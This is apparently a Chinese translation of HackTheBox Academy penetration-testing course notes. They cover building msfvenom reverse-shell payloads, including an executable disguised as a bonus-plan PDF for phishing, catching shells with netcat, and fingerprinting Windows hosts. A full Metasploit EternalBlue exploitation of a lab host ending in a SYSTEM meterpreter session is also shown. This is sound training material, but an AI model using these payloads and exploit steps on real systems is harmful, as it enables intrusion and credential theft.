想象一下：目标机器是 IT 管理员用来管理网络设备的 Ubuntu 主机（托管配置脚本、访问路由器和交换机等）。我们可以让他们点击我们发送的电子邮件中的文件，因为他们粗心地把这个系统当作个人电脑或工作站来使用。

#### Ubuntu Payload

![image](https://academy.hackthebox.com/storage/modules/115/ubuntupayload.png)

成功执行后，我们会在攻击机端准备好一个监听器来捕获连接。

#### NC Connection

NC Connection

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443
```

当文件被执行时，我们看到我们捕获了一个 shell。

#### Connection Established

Connection Established

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

这个相同的概念可以用于为各种平台创建载荷，包括 Windows。

---

## 为 Windows 系统构建简单的无阶段载荷

我们也可以使用 msfvenom 制作一个可执行文件（`.exe`），该文件可以在 Windows 系统上运行以提供 shell。

#### Windows Payload

Windows Payload

```shell-session
tr01ax@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

命令语法可以用与上面相同的方式分解。唯一的区别当然是 `platform`（平台）（`Windows`）和载荷的 format（格式）（`.exe`）。

---

## 在 Windows 系统上执行简单的无阶段载荷

这是另一种我们需要发挥创造力将这个载荷传递到目标系统的情况。如果没有任何 `encoding`（编码）或 `encryption`（加密），这种形式的载荷几乎肯定会被 Windows Defender AV（杀毒软件）检测到。

![image](https://academy.hackthebox.com/storage/modules/115/winpayload.png)

如果杀毒软件被禁用，用户只需双击文件执行，我们就会获得一个 shell 会话。

Windows Payload

```shell-session
tr01ax@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```#shell #windows #payload #hacking [source](https://academy.hackthebox.com/module/115/section/1109)

---

自我们记事以来，微软在家用和企业计算市场一直占据主导地位。在现代，随着 Active Directory（活动目录）功能的改进、与云服务的更多互联性、Windows 子系统 Linux 版等的引入，微软的攻击面也随之增长。

例如，仅在过去五年中，仅微软产品就报告了 `3688` 个漏洞，而且这个数字每天都在增长。这个表格来源于[这里](https://www.cvedetails.com/vendor/26/Microsoft.html)

---

#### Windows Vulnerability Table

![image](https://academy.hackthebox.com/storage/modules/115/window-vulns-table.png)

## 著名的 Windows 漏洞利用

在过去几年中，Windows 操作系统中的几个漏洞及其相应的攻击是我们这个时代被利用最多的漏洞之一。让我们讨论一下这些：

|**漏洞**|**描述**|
|---|---|
|`MS08-067`|MS08-067 是一个针对许多不同 Windows 版本推送的关键补丁，原因是 SMB 漏洞。这个漏洞使得入侵 Windows 主机变得极其容易。它效率如此之高，以至于 Conficker 蠕虫利用它来感染遇到的每个易受攻击的主机。甚至 Stuxnet（震网病毒）也利用了这个漏洞。|
|`Eternal Blue`|MS17-010 是 Shadow Brokers（影子经纪人）从 NSA（美国国家安全局）泄露的漏洞利用。这个漏洞利用最著名的是在 WannaCry 勒索软件和 NotPetya 网络攻击中使用。这次攻击利用了 SMB v1 协议中的漏洞，允许代码执行。EternalBlue 据信仅在 2017 年就感染了超过 200,000 台主机，至今仍是访问易受攻击 Windows 主机的常见方式。|
|`PrintNightmare`|Windows 打印后台处理程序中的远程代码执行漏洞。凭借该主机的有效凭据或低权限 shell，你可以安装打印机，添加一个为你运行的驱动程序，并授予你对主机的系统级访问权限。这个漏洞在 2021 年肆虐各公司。0xdf 写了一篇关于它的精彩文章[在这里](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)。|
|`BlueKeep`|CVE 2019-0708 是微软 RDP（远程桌面协议）协议中的一个漏洞，允许远程代码执行。这个漏洞利用了一个错误调用的通道来获得代码执行，影响从 Windows 2000 到 Server 2008 R2 的每个 Windows 版本。|
|`Sigred`|CVE 2020-1350 利用了 DNS 读取 SIG 资源记录方式中的漏洞。它比这个列表中的其他漏洞利用更复杂，但如果正确执行，它将授予攻击者域管理员权限，因为它将影响通常是主域控制器的域 DNS 服务器。|
|`SeriousSam`|CVE 2021-36924 利用了 Windows 处理 `C:\Windows\system32\config` 文件夹权限方式的问题。在修复此问题之前，非提权用户可以访问 SAM 数据库以及其他文件。这本身不是一个大问题，因为在 PC 使用时无法访问这些文件，但在查看卷影副本备份时就变得危险了。备份文件上也存在相同的权限错误，允许攻击者读取 SAM 数据库，转储凭据。|
|`Zerologon`|CVE 2020-1472 是一个关键漏洞，利用了微软 Active Directory Netlogon 远程协议（MS-NRPC）中的加密漏洞。它允许用户使用 NT LAN Manager（NTLM）登录服务器，甚至通过协议发送帐户更改。攻击可能有点复杂，但执行起来是微不足道的，因为攻击者在找到所需内容之前必须对计算机帐户密码进行大约 256 次猜测。这可能只需要几秒钟。|

考虑到这些漏洞，Windows 不会消失。我们需要精通识别漏洞、利用它们以及在 Windows 主机和环境中移动。理解这些概念也可以帮助我们保护我们的环境免受攻击。现在是时候深入探索一些以 Windows 为中心的漏洞利用乐趣了。

---

## 枚举 Windows 和指纹识别方法

本模块假设你已经执行了主机枚举阶段，并了解主机上常见的服务。我们只是试图给你一些快速技巧来确定主机是否可能是 Windows 机器。查看 [Network Enumeration With NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) 模块以更详细地了解主机枚举和指纹识别。

既然我们有一组目标，`有哪些方法可以确定主机是否可能是 Windows 机器？`要回答这个问题，我们可以看几个方面。第一个是使用 ICMP 确定主机是否在线时的 `Time To Live`（TTL，生存时间）计数器。Windows 主机的典型响应要么是 32，要么是 128。128 左右的响应是你最常看到的值。这个值可能并不总是准确的，特别是如果你与目标不在同一个第三层网络中。我们可以使用这个值，因为大多数主机到你的起点永远不会超过 20 跳，所以 TTL 计数器降到另一个操作系统类型可接受值的可能性很小。在下面的 ping 输出中，我们可以看到一个例子。对于这个例子，我们 ping 了一台 Windows 10 主机，可以看到我们收到了 TTL 为 128 的回复。查看这个[链接](https://subinsb.com/default-device-ttl-values/)获取按操作系统显示其他 TTL 值的表格。

#### Pinged Host

Pinged Host

```shell-session
tr01ax@htb[/htb]$ ping 192.168.86.39

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

另一种验证主机是否为 Windows 的方法是使用我们的便捷工具 `NMAP`。Nmap 内置了一个很酷的功能来帮助操作系统识别，以及许多其他脚本扫描来检查从特定漏洞到从 SNMP 收集的信息等任何内容。对于这个例子，我们将使用 `-O` 选项和详细输出 `-v` 来对我们的目标 `192.168.86.39` 启动操作系统识别扫描。当我们滚动浏览下面的 shell 会话并查看结果时，有几个方面表明这是一台 Windows 主机。我们稍后会重点关注这些。仔细查看 shell 会话的底部。我们可以看到标记为 `OS CPE: cpe:/o:microsoft:windows_10` 和 `OS details: Microsoft Windows 10 1709 - 1909` 的点。Nmap 根据它从 TCP/IP 堆栈获得的几个不同指标做出了这个猜测。它使用这些特征来确定操作系统，因为它将其与操作系统指纹数据库进行检查。在这种情况下，Nmap 确定我们的主机是修订级别在 1709 到 1909 之间的 Windows 10 机器。

如果你遇到问题并且扫描结果很少，请尝试使用 `-A` 和 `-Pn` 选项重试。这将执行不同的扫描，可能会有效。有关此过程工作原理的更多信息，请查看 [Nmap 文档](https://nmap.org/book/man-os-detection.html)中的这篇文章。请注意这种检测方法。实施防火墙或其他安全功能可能会掩盖主机或扰乱结果。在可能的情况下，使用多种检查来做出判断。

#### OS Detection Scan

OS Detection Scan

```shell-session
tr01ax@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39)
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
```

现在我们知道我们正在处理一台 Windows 10 主机，我们需要枚举我们可以看到的服务，以确定是否有潜在的利用途径。要执行横幅抓取（banner grabbing），我们可以使用几种不同的工具。Netcat、Nmap 和许多其他工具可以执行我们需要的枚举，但对于这个例子，我们将查看一个名为 `banner.nse` 的简单 Nmap 脚本。对于 Nmap 看到的每个开放端口，它将尝试连接到该端口并从中收集任何信息。在下面的会话中，Nmap 尝试连接每个端口，但只有端口 902 和 912 给出了响应。根据页面横幅，它们与 VMWare Workstation 有关。我们可以尝试找到与该协议相关的漏洞利用，或者我们可以进一步枚举其他端口。在真正的渗透测试中，你会想要尽可能彻底，确保你完全了解情况。

#### Banner Grab to Enumerate Ports

Banner Grab to Enumerate Ports

```shell-session
tr01ax@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
```

上面显示的例子只是帮助指纹识别和确定主机是否为 Windows 机器的几种方法。这绝不是一个详尽的列表，还有许多其他检查可以做。现在我们已经讨论了指纹识别，让我们来看看在构建载荷时几种文件类型及其用途。

---

## Bat、DLL 和 MSI 文件，天哪！

当涉及到为 Windows 主机创建载荷时，我们有很多选择。DLL、批处理文件、MSI 包，甚至 PowerShell 脚本都是一些最常用的方法。每种文件类型可以为我们完成不同的事情，但它们的共同点是它们可以在主机上执行。尝试记住你的载荷传递机制，因为这可以决定你使用什么类型的载荷。

#### Payload Types to Consider

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) 动态链接库（DLL，Dynamic Linking Library）是在微软操作系统中使用的库文件，用于提供可以同时被许多不同程序使用的共享代码和数据。这些文件是模块化的，允许我们拥有更动态且更易于更新的应用程序。作为渗透测试人员，注入恶意 DLL 或劫持主机上的易受攻击的库可以将我们的权限提升到 SYSTEM 和/或绕过用户帐户控制。

- [Batch](https://commandwindows.com/batch.htm) 批处理文件是基于文本的 DOS 脚本，系统管理员利用它通过命令行解释器完成多个任务。这些文件以 `.bat` 扩展名结尾。我们可以使用批处理文件以自动化方式在主机上运行命令。例如，我们可以让批处理文件在主机上打开一个端口，或连接回我们的攻击机。完成后，它可以执行基本枚举步骤，并通过打开的端口向我们反馈信息。

- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript 是基于微软 Visual Basic 的轻量级脚本语言。它通常在 Web 服务器中用作客户端脚本语言以启用动态网页。VBS 已经过时，被大多数现代 Web 浏览器禁用，但在钓鱼和其他旨在让用户执行操作的攻击中仍然存在，例如在 Excel 文档中启用宏加载或单击单元格以让 Windows 脚本引擎执行一段代码。

- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` 文件作为 Windows 安装程序的安装数据库。当尝试安装新应用程序时，安装程序将查找 .msi 文件以了解所需的所有组件以及如何找到它们。我们可以通过将载荷制作为 .msi 文件来使用 Windows 安装程序。一旦它在主机上，我们可以运行 `msiexec` 来执行我们的文件，这将为我们提供进一步的访问，例如提升的反向 shell。

- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell 既是 shell 环境又是脚本语言。它是微软在其操作系统中的现代 shell 环境。作为脚本语言，它是基于 .NET 公共语言运行时的动态语言，与其 shell 组件一样，以 .NET 对象作为输入和输出。当涉及到获取 shell 和在主机上执行时，PowerShell 可以为我们提供大量选项，以及渗透测试过程中的许多其他步骤。


现在我们了解了每种 Windows 文件类型的用途，让我们讨论一些用于构建载荷和将其传递到主机以获得 shell 的基本工具、战术和程序。

---

## 载荷生成、传输和执行的工具、战术和程序

下面你将找到不同载荷生成方法和将载荷传输到受害者的方式的示例。我们将在高层次上讨论其中一些方法，因为我们的重点是载荷生成本身以及在目标上获取 shell 的不同方式。

#### Payload Generation

在处理生成用于 Windows 主机的载荷时，我们有很多好的选择。我们在之前的章节中已经提到了其中一些。例如，Metasploit-Framework 和 MSFVenom 是生成载荷的非常方便的方式，因为它是操作系统无关的。下表列出了我们的一些选择。但是，这不是一个详尽的列表，新资源每天都在出现。

|**资源**|**描述**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF 是任何渗透测试人员工具包中极其多功能的工具。它可以作为枚举主机、生成载荷、利用公共和自定义漏洞以及在主机上执行后渗透操作的方式。把它想象成一把瑞士军刀。|
|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) 在这里，你可以找到许多不同的载荷生成资源和速查表以及通用方法论。|
|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) Mythic C2 框架是 Metasploit 作为命令和控制框架以及独特载荷生成工具箱的替代选择。|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang 是攻击性 PowerShell 植入物和脚本的框架集合。它包括许多对任何渗透测试人员都有用的实用程序。|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour 是一个生成和利用混淆二进制文件用于 Windows 主机的工具。|

#### Payload Transfer and Execution:

除了 Web 路过式攻击、钓鱼邮件或死信投递等载体外，Windows 主机可以为我们提供几种其他的载荷传递途径。下面的列表包括一些在尝试向目标投递载荷时有用的工具和协议。

- `Impacket`：[Impacket](https://github.com/SecureAuthCorp/impacket) 是一个用 Python 构建的工具集，为我们提供了一种直接与网络协议交互的方式。我们在 Impacket 中最感兴趣的一些工具涉及 `psexec`、`smbclient`、`wmi`、Kerberos 以及建立 SMB 服务器的能力。
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)：是一个很好的资源，可以找到快速的单行命令来帮助在主机之间快速传输文件。
- `SMB`：SMB 可以提供一种易于利用的路由来在主机之间传输文件。当受害主机加入域并使用共享托管数据时，这特别有用。作为攻击者，我们可以使用这些 SMB 文件共享以及 C$ 和 admin$ 来托管和传输我们的载荷，甚至通过链接渗出数据。
- `通过 MSF 远程执行`：Metasploit 中许多漏洞利用模块内置了一个功能，可以自动构建、暂存和执行载荷。
- `其他协议`：在查看主机时，FTP、TFTP、HTTP/S 等协议可以为你提供一种将文件上传到主机的方式。枚举并注意开放和可用的功能。

现在我们知道可以使用哪些工具、战术和程序来传输我们的载荷，让我们来看一个攻击过程的示例。

---

## 攻击过程示例演练

1. 枚举主机

Ping、Netcat、Nmap 扫描，甚至 Metasploit 都是开始枚举潜在受害者的好选择。这次开始，我们将使用 Nmap 扫描。任何漏洞利用链的枚举部分可以说是最关键的部分。了解目标及其运作方式将提高你获得 shell 的机会。

#### Enumerate the Host

Enumerate the Host

```shell-session
tr01ax@htb[/htb]$ nmap -v -A 10.129.201.97

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
```
  139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
  445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
  Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29

```

在扫描和验证示例主机的过程中，我们发现了一些信息。它运行的是 `Windows Server 2016 Standard 6.3`。我们现在获取了主机名，并且知道它不在域中且运行着多个服务。现在我们已经收集了一些信息，让我们确定潜在的利用路径。
`IIS` 可能是一个潜在的路径，使用像 Impacket 这样的工具通过 SMB（Server Message Block，服务器消息块协议）访问主机或在有凭据的情况下进行身份验证都可以实现，从操作系统的角度来看，也可能存在 RCE（Remote Code Execution，远程代码执行）的途径。MS17-010（EternalBlue，永恒之蓝）已知会影响从 Windows 2008 到 Server 2016 的主机。考虑到这一点，我们的受害者很可能存在漏洞，因为它在这个范围内。让我们使用 `Metasploit` 的内置辅助检查模块 `auxiliary/scanner/smb/smb_ms17_010` 来验证这一点。

2. 搜索并确定利用路径

打开 `msfconsole` 并搜索 EternalBlue，或者你可以使用下面会话中的字符串来使用检查模块。使用目标的 IP 地址设置 RHOSTS 字段并启动扫描。从模块的选项中可以看到，你可以填写更多的 SMB 设置，但这不是必需的。它们将有助于提高检查成功的可能性。准备好后，输入 `run`。

#### 确定利用路径

确定利用路径

```shell-session
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

现在，我们可以从检查结果中看到我们的目标很可能存在 EternalBlue 漏洞。让我们现在设置利用程序和载荷，然后尝试一下。

3. 选择利用程序和载荷，然后投递

#### 选择并配置我们的利用程序和载荷

选择并配置我们的利用程序和载荷

```shell-session
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

在这个实例中，我们使用搜索功能在 MSF 的利用模块中挖掘，寻找与 EternalBlue 匹配的利用程序。上面的列表就是结果。由于我使用这个利用程序的 `psexec` 版本运气更好，我们将首先尝试它。让我们选择它并继续设置。

#### 配置利用程序和载荷

配置利用程序和载荷

```shell-session
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

在运行利用程序之前，请确保正确设置载荷选项。任何 `Required` 设置为 yes 的选项都是必须填写的。在这种情况下，我们需要确保 `RHOSTS、LHOST 和 LPORT` 字段设置正确。对于这次尝试，接受其余的默认值是可以的。

#### 验证我们的选项

验证我们的选项

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

这次，我们保持简单，只使用了 `windows/meterpreter/reverse_tcp` 载荷。你可以根据需要更改为不同的 shell 类型，或者按照前面载荷部分所示的方式进一步混淆你的攻击。设置好选项后，让我们试试看能否获得一个 shell。

4. 执行攻击，并接收回调。

#### 执行我们的攻击

执行我们的攻击

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

成功！我们成功利用了漏洞并获得了一个 shell 会话。而且是 `SYSTEM` 级别的 shell。如早期 MSF 模块所示，现在我们通过 Meterpreter 拥有了一个开放的会话，我们会看到 `meterpreter >` 提示符。从这里，我们可以使用 Meterpreter 运行更多命令来收集系统信息、窃取用户凭据，或者对主机使用其他后渗透模块。如果你希望直接与主机交互，你也可以从 Meterpreter 进入主机上的交互式 shell 会话。

5. 识别原生 Shell。

#### 识别我们的 Shell

识别我们的 Shell

```shell-session
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

当我们执行 Meterpreter 命令 `shell` 时，它在主机上启动了另一个进程并让我们进入了一个系统 shell。你能从提示符判断我们在什么环境中吗？仅看到 `C:\Windows\system32>` 就可以让我们知道我们只是在 `cmd.exe shell` 中。为了确认，只需从 shell 中运行 help 命令也能让你知道。如果我们进入的是 PowerShell，我们的提示符会像 `PS C:\Windows\system32>` 这样。前面的 PS 让我们知道这是一个 PowerShell 会话。恭喜你成功在我们最新攻陷的 Windows 主机上获得了 shell。

现在我们已经完成了一个示例入侵过程，让我们来看看当你登陆主机时可能遇到的各种 shell。

---

## CMD 命令提示符和 Power[Shell] 的乐趣与收益

在 Windows 主机上，我们很幸运地默认有两种 shell 可供选择。现在你可能想知道：

`哪一个是正确的选择？`

答案很简单，就是能在当时为你提供所需功能的那个。让我们比较一下 `cmd` 和 `PowerShell`，了解它们各自提供什么以及何时最适合选择其中一个。

